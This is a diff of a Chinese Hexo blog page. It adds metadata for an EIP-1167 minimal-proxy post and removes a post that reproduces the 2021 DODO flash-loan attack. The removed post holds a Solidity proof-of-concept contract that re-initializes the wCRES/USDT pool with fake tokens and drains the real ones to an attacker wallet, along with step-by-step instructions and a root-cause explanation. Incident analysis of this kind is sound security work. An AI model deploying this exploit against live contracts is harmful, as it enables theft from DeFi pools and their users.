@@ -7,13 +7,26 @@
   
   <title>SCC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="EIP1167-最小合约代理的理解避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。 当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。 总体思路：设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来">
+<meta property="og:type" content="article">
 <meta property="og:title" content="SCC">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/index.html">
 <meta property="og:site_name" content="SCC">
+<meta property="og:description" content="EIP1167-最小合约代理的理解避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。 当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。 总体思路：设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194253819.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194317822.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194435666.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194746689.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195105183.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195316198.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195513372.png">
+<meta property="og:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195957062.png">
+<meta property="article:published_time" content="2021-09-27T02:17:23.899Z">
+<meta property="article:modified_time" content="2021-09-27T03:17:04.786Z">
 <meta property="article:author" content="Janson Woods">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194253819.png">
   
     <link rel="alternate" href="/atom.xml" title="SCC" type="application/atom+xml">
   
@@ -62,76 +75,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-DODO-flashloan攻击分析与复现" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2021-09-27T02:42:40.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">DODO_FlashLoan攻击复现--狸猫换太子</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210925204033395.png" alt="image-20210925204033395"></p>
-<p>通过事件最后的状态可知，攻击者地址减少的两种空气币数额与攻击合约增加的WrappedERC20、TetherToken数额一一对应，相当于将DVM合约中WrappedERC20、TetherToken的两种币”等价的“交换为两种空气币。</p>
-<h3 id="攻击简述"><a href="#攻击简述" class="headerlink" title="攻击简述"></a>攻击简述</h3><p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210925210916212.png" alt="image-20210925210916212"></p>
-<p>交易哈希：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h3><h4 id="1-发两种空气币token1，token2"><a href="#1-发两种空气币token1，token2" class="headerlink" title="1.发两种空气币token1，token2."></a>1.发两种空气币token1，token2.</h4><p>erc20代币合约</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract _ERC20 is ERC20, Ownable &#123;</span><br><span class="line">    </span><br><span class="line">    uint8 private currentDecimals;</span><br><span class="line">    enum TOKEN_TYPE &#123;CAPPED,UNCAPPED&#125;</span><br><span class="line">    TOKEN_TYPE public tokenType;</span><br><span class="line">    </span><br><span class="line">    constructor(</span><br><span class="line">        string memory _name, </span><br><span class="line">        string memory _symbol,</span><br><span class="line">        uint8 _decimals,</span><br><span class="line">        uint256 _initialSupply,</span><br><span class="line">        TOKEN_TYPE _tokenType</span><br><span class="line">    ) ERC20(_name, _symbol) &#123;</span><br><span class="line">        currentDecimals = _decimals;</span><br><span class="line">        tokenType = _tokenType;</span><br><span class="line">        / mint token to the address of the account that sent the transaction.</span><br><span class="line">        transferOwnership(tx.origin);</span><br><span class="line">        _mint(tx.origin, _initialSupply * (10**uint256(_decimals)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier unCapped &#123;</span><br><span class="line">      require(tokenType == _ERC20.TOKEN_TYPE.UNCAPPED,&quot;support only uncapped token&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual override returns (uint8) &#123;</span><br><span class="line">        return currentDecimals;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123;</span><br><span class="line">        _mint(_address,_amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123;</span><br><span class="line">        _burn(_address,_amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>token1：</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927092451496.png" alt="image-20210927092451496"></p>
-<p>token2：</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927092549154.png" alt="image-20210927092549154"></p>
-<h4 id="2-将空气币打入wCRES-USDT交易对"><a href="#2-将空气币打入wCRES-USDT交易对" class="headerlink" title="2.将空气币打入wCRES/USDT交易对"></a>2.将空气币打入<code>wCRES/USDT</code>交易对</h4><p>wCRES/USDT 地址：0x051EBD717311350f1684f89335bed4ABd083a2b6</p>
-<p>各打入足量的数量（10000000000000000000000000000）。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093126488.png" alt="image-20210927093126488"></p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093214508.png" alt="image-20210927093214508"></p>
-<h4 id="3-修改攻击合约参数"><a href="#3-修改攻击合约参数" class="headerlink" title="3.修改攻击合约参数"></a>3.修改攻击合约参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2021-01-22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">    Copyright 2020 DODO ZOO.</span><br><span class="line">    SPDX-License-Identifier: Apache-2.0</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">pragma solidity 0.6.9;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">interface DVM&#123;</span><br><span class="line">    </span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line">    </span><br><span class="line">    function init(</span><br><span class="line">        address maintainer,</span><br><span class="line">        address baseTokenAddress,</span><br><span class="line">        address quoteTokenAddress,</span><br><span class="line">        uint256 lpFeeRate,</span><br><span class="line">        address mtFeeRateModel,</span><br><span class="line">        uint256 i,</span><br><span class="line">        uint256 k,</span><br><span class="line">        bool isOpenTWAP</span><br><span class="line">    ) external;        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">    function transfer(address recipient, uint amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface USDT&#123;</span><br><span class="line">    /USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义</span><br><span class="line">    function transfer(address to, uint value) external;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract poc&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    uint256 wCRES_amount =  130000000000000000000000;</span><br><span class="line">    </span><br><span class="line">    uint256 usdt_amount =  1100000000000;</span><br><span class="line">    </span><br><span class="line">    address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a;</span><br><span class="line">    </span><br><span class="line">    address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7;</span><br><span class="line">    </span><br><span class="line">    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    / 这里是刚生成的Token1地址</span><br><span class="line">    address token1 = 0x9431cc8868a6a9993E25C7abB93aD2aca5592c5C;</span><br><span class="line">    / 这里是刚生成的Token2地址</span><br><span class="line">    address token2 = 0x445390C704Ed94F2F719d0eb7cda2633a72753A5;</span><br><span class="line">    </span><br><span class="line">    uint256 lpFeeRate = 3000000000000000;</span><br><span class="line">    </span><br><span class="line">    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;</span><br><span class="line">    </span><br><span class="line">    uint256 i = 1;</span><br><span class="line">    </span><br><span class="line">    uint256 k = 1000000000000000000;</span><br><span class="line">    </span><br><span class="line">    bool isOpenTWAP = false;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    / 这里填你的测试地址</span><br><span class="line">    address  wallet = ;</span><br><span class="line">    </span><br><span class="line">    address dvm_wCRES_USDT =  0x051EBD717311350f1684f89335bed4ABd083a2b6;</span><br><span class="line">    </span><br><span class="line">    bytes data = abi.encodeWithSignature(&quot;init(address,address,address,uint256,address,uint256,uint256,bool)&quot;,maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        </span><br><span class="line">        address me = address(this);</span><br><span class="line">        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);</span><br><span class="line">        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,&quot; &quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public&#123;</span><br><span class="line">        </span><br><span class="line">        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);</span><br><span class="line">        DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);</span><br><span class="line">        </span><br><span class="line">        Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this)));</span><br><span class="line">        USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>该攻击合约主要完成一下工作：</p>
-<p>1.调用DVM的闪电贷函数进行闪电贷，将传入的assetTo参数修改为攻击合约。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093647267.png" alt="image-20210927093647267"></p>
-<p>2.DVM执行闪电贷逻辑，先进性乐观转账后，调用assetTo地址的DVMFlashLoanCall函数，由于攻击者传入的assetTo参数的值为攻击合约地址，因此会调用攻击合约中的DVMFlashLoanCall函数，</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927093947219.png" alt="image-20210927093947219"></p>
-<p>在该函数中，对wCRES/USDT 交易对合约（DVM合约）进行初始化函数（init）的调用。使得合约中      交易对地址信息baseTokenAddress,quoteTokenAddress,变为攻击者发行的两个空气币地址。</p>
-<p>3.执行闪电贷的赎回操作</p>
-<p>由于此时攻击者已将合约的交易对地址信息初始化为两种空气币的地址，并在实现给交易对地址打入了足量的两种空气币。使得DVM合约认为两种空气币就是原来的两种代币，并且是足量的，完成闪电贷最后的检查工作。</p>
-<p><img src="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210927101352668.png" alt="image-20210927101352668"></p>
-<p>因此本次攻击是因为项目方并没有对初始化加以身份权限设定，使得任何人可以调用init函数。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" data-id="cku232eqj0000mahjc2ph3toq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-EIP1167-最小合约代理的理解" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-EIP1167-最小合约代理的理解" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/" class="article-date">
   <time datetime="2021-09-27T02:17:23.899Z" itemprop="datePublished">2021-09-27</time>
@@ -173,11 +117,23 @@
     </footer>
   </div>
   
-</article>
-
+    
+<nav id="article-nav">
+  
+    <a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DODO_FlashLoan攻击复现--狸猫换太子
+        
+      </div>
+    </a>
+  
+  
+</nav>
 
   
-
+</article>
 
 </section>
         
